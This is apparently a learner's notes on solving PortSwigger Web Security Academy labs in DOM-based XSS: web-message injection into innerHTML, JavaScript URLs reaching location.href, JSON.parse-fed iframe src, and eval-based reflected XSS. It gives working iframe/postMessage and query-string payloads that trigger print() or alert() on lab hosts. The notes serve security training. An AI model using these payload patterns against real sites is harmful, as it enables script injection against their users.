## DOM-Based Vulnerabilities 

#### Lab: DOM XSS Using Web Messages
- Exploit server to post a message to the target site that causes the `print()` function to be called.
- When I loaded the lab, I noticed this odd `[object Object` that was appearing at the top of the homepage. I reviewed the source code, and I saw the following JavaScript. I recognized the `innerHTML` as bad immediately. So it's getting the document with element id of `ads`. Unlike the resource available at https://portswigger.net/web-security/dom-based/controlling-the-web-message-source, this is not being passed into an `eval()` function.
- The issue here is that the  event listener does not verify the origin of the message, and the postMessage() from the iframe specifies targetOrigin as *, the event listener accepts the payload and passes it into the sink.
```
<script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
                    </script>
```
- So let's construct an iframe ... at first, I was really confused because I could not get the script tags to work. Then I found this: "The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`. Event handlers such as `onload` and `onerror` can be used in conjunction with these elements."
  - I started with `<iframe src="https://0a8b009b04034dbd81757127009a00ac.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('</div></div><script>print()</script>','*')">`, and then I transformed it to this: `<iframe src="https://0a8b009b04034dbd81757127009a00ac.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">` which solved the lab (resulting in the print popup window!). 
<img width="2542" height="1353" alt="image" src="https://github.com/user-attachments/assets/47ecf6a9-5ae3-4025-9725-c6f0af766487" />

#### Lab: DOM XSS Using Web Messages and JavaScript URL
- I knew it was a DOM-based redirection vulnerability through web messaging, so I just needed to locate it. I noticed there was comment functionality on the blog posts of the web app, so I focused there.
- The comment functionality allows a user to provide a website, which is then linked to the username. Upon pressing the username, the user is redirected to the website ... this must be where the vulnerability is. Let's take a look...wait, there's no web messaging functionality here. This must not be it. Good place to look for another lab, but let's move on ...
- Ah, I found it on the homepage...there's the sink, `location.href`, which is the full URL of the current page. We know that we need to construct an HTML page on the exploit server to solve this lab:
```

                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);

```
- I struggled with constructing the payload here. I knew it needed to have `https:` or `http:`, and I knew it was a JavaScript URL. I attempted `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print(); http:','*')">` thinking the semicolon would terminate it, but I wasn't really considering the rest of the message - the http:. What I needed to do instead was comment out the rest with JavaScript comment, `//`, to prevent a syntax error or whatever that was causing the failure on my origina attempt ... so the final payload is `<iframe src="https://0aad00b0039dc1f980ba1c2e003f00ae.web-security-academy.net/" width="2000" height="2000" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`.

#### Lab: DOM XSS Using Web Messages and `JSON.parse`
```

                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
```
- The final payload was `<iframe src=https://0a83008804269a0380e017cb00670089.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`. What did I learn? You need to backslash quotation marks for JSON, `\"`. I reviewed the code, and I noted that `d.url` could be provided as the JavaScript URL from the previous lab. I can see the cases to assist with the JSON keys...
- When the constructed `iframe` loads, the `postMessage()` method sends a web message to the home page with the type `load-channel`. The event listener receives the message and parses it with `JSON.parse()` before sending it to the switch.
- The switch triggers `load-channel` case, which assigns the `url` property of the message to the `src` attribute of the ACMEplayer.element `iframe`. However, in our case, the `url` property of the message was actually a JavaScript payload. 
- **Why does this happen?** The event handler does not contain any form of origin check and the second argument specifics that any targetOrigin is allowed for the web message.

#### Lab: Reflected DOM XSS
- I navigated to the Debugger, and I reviewed the JavaScript file titled 'searchResults.js'. During this time, I got distracted, and I basically forgot to examine the requests coming into Burp altogether. This would be a mistake. 
- If I had paid attention, I would've noticed my search term is displayed as part of JSON. Reviewing searchResultsjs, we see this: `eval('var searchResultsObj = ' + this.responseText);`. Reminder, XHR is XML HTTP Request which is an API in the form of a JavaScript object to transmit HTTP method requests from a web browser to a web server. 
- To break out of the JSON, I had to experiment with quotes and backslashes: `/search-results?search=\"\}test`
![alt text](<Photos/2025-08-31 21_55_27-Burp Suite Community Edition v2025.7.4 - Temporary Project.png>)
![alt text](<Photos/2025-08-31 21_56_56-Burp Suite Community Edition v2025.7.4 - Temporary Project.png>)
- Final payload ended up being `search=\"-alert(1)}//`. 